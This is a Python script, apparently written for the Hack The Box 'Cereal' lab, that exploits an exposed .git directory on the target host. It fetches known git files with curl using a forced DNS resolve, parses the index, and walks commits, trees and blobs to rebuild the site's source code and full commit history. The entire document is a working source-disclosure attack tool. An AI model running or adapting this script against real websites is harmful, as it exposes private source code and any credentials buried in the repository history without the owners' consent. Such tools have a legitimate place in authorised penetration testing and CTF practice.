#!/usr/bin/env python3
"""Dump exposed .git/ via curl --resolve since DNS aliasing is not available without sudo."""
import os, subprocess, re, sys, zlib, hashlib, struct
from pathlib import Path

HOST = "source.cereal.htb"
IP = "10.129.28.172"
BASE = f"https://{HOST}"
OUT = Path(sys.argv[1] if len(sys.argv) > 1 else "artifacts/cereal-src")
OUT.mkdir(parents=True, exist_ok=True)

session_files = set()
queue = []

KNOWN = [
    ".git/HEAD", ".git/config", ".git/description", ".git/info/exclude",
    ".git/info/refs", ".git/objects/info/packs", ".git/packed-refs",
    ".git/logs/HEAD", ".git/index", ".git/COMMIT_EDITMSG",
    ".git/refs/heads/master", ".git/refs/heads/main",
    ".gitignore",
]

def fetch(path):
    if path in session_files:
        return None
    session_files.add(path)
    out_path = OUT / path
    out_path.parent.mkdir(parents=True, exist_ok=True)
    r = subprocess.run(
        ["curl", "-sk", "--resolve", f"{HOST}:443:{IP}", "-o", str(out_path), "-w", "%{http_code}", f"{BASE}/{path}"],
        capture_output=True, text=True
    )
    code = r.stdout.strip()
    if code != "200":
        out_path.unlink(missing_ok=True)
        return None
    return out_path.read_bytes()

def parse_index(data):
    """Read paths from .git/index — DIRC format."""
    if not data.startswith(b"DIRC"):
        return []
    n = struct.unpack(">I", data[8:12])[0]
    pos = 12
    paths = []
    for _ in range(n):
        if pos + 62 > len(data): break
        # entry: 10 fixed 32-bit fields = 40, sha1 = 20, flags = 2, total 62
        sha = data[pos+40:pos+60].hex()
        flags = struct.unpack(">H", data[pos+60:pos+62])[0]
        path_start = pos + 62
        # name length is low 12 bits of flags; if 0xFFF, scan for NUL
        name_len = flags & 0xFFF
        if name_len < 0xFFF:
            name = data[path_start:path_start+name_len].decode("utf-8", "ignore")
        else:
            end = data.index(b"\x00", path_start)
            name = data[path_start:end].decode("utf-8", "ignore")
            name_len = end - path_start
        # entries padded to 8-byte alignment incl trailing NUL
        total = 62 + name_len
        pad = 8 - (total % 8) if total % 8 else 8
        pos = path_start + name_len + pad
        paths.append((sha, name))
    return paths

def fetch_object(sha):
    p = f".git/objects/{sha[:2]}/{sha[2:]}"
    return fetch(p)

def parse_object(blob):
    raw = zlib.decompress(blob)
    nul = raw.index(b"\x00")
    header = raw[:nul]
    kind, size = header.split(b" ")
    return kind.decode(), int(size), raw[nul+1:]

def walk_tree(sha, prefix=""):
    obj = fetch_object(sha)
    if obj is None: return
    kind, size, body = parse_object(obj)
    if kind != "tree": return
    pos = 0
    while pos < len(body):
        sp = body.index(b" ", pos)
        nul = body.index(b"\x00", sp)
        mode = body[pos:sp].decode()
        name = body[sp+1:nul].decode("utf-8", "ignore")
        sha = body[nul+1:nul+21].hex()
        pos = nul + 21
        full = f"{prefix}{name}"
        if mode == "40000":
            walk_tree(sha, full + "/")
        else:
            obj2 = fetch_object(sha)
            if obj2 is None: continue
            k, s, content = parse_object(obj2)
            if k == "blob":
                target = OUT / "_files" / full
                target.parent.mkdir(parents=True, exist_ok=True)
                target.write_bytes(content)

# Phase 1: known paths
for p in KNOWN:
    fetch(p)

# Phase 2: refs / packed-refs to find commit shas
shas_to_visit = set()
for ref in [".git/HEAD", ".git/refs/heads/master", ".git/packed-refs"]:
    f = OUT / ref
    if f.exists():
        text = f.read_text(errors="ignore")
        for m in re.findall(r"\b[a-f0-9]{40}\b", text):
            shas_to_visit.add(m)

# Phase 3: walk commits → trees → blobs
def walk_commit(sha, seen=None):
    if seen is None: seen = set()
    if sha in seen: return
    seen.add(sha)
    obj = fetch_object(sha)
    if obj is None: return
    kind, size, body = parse_object(obj)
    if kind != "commit": return
    text = body.decode("utf-8", "ignore")
    tree_m = re.search(r"^tree ([a-f0-9]{40})", text, re.M)
    if tree_m:
        walk_tree(tree_m.group(1), prefix=f"_history/{sha[:8]}/")
    for parent in re.findall(r"^parent ([a-f0-9]{40})", text, re.M):
        walk_commit(parent, seen)
    # save commit msg
    out = OUT / "_commits" / f"{sha}.txt"
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(text, errors="ignore")

for sha in list(shas_to_visit):
    walk_commit(sha)

# Phase 4: also walk index for HEAD blobs
idx = OUT / ".git/index"
if idx.exists():
    for sha, name in parse_index(idx.read_bytes()):
        obj = fetch_object(sha)
        if obj is None: continue
        k, s, content = parse_object(obj)
        if k == "blob":
            target = OUT / "_index" / name
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_bytes(content)

print(f"Fetched {len(session_files)} files")
print("Top-level _index:")
subprocess.run(["ls", str(OUT / "_index")])
print("Commit msgs:")
for c in (OUT / "_commits").glob("*.txt"):
    print(c)
